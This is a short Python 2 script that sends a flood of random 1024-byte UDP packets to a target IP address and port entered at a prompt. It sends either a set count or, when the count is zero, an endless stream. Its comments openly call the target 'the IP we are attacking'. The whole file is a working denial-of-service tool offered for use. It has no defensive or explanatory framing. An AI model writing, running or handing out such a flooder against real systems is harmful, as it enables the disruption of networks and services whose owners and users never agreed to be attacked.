#! /usr/bin/python
import socket
import random

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet
ip=raw_input('Target IP: ') #The IP we are attacking
port=input('Port: ') #Port we direct to attack
stopAt=input('How many packets should we send? (0 for infinite)')
sent=1;

if (stopAt > 0):
	while (sent <= stopAt): #Infinitely loops sending packets to the port until the program is exited.
		sock.sendto(bytes,(ip,port))
		print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
		sent= sent + 1
else:
	while 1:
		sock.sendto(bytes,(ip,port))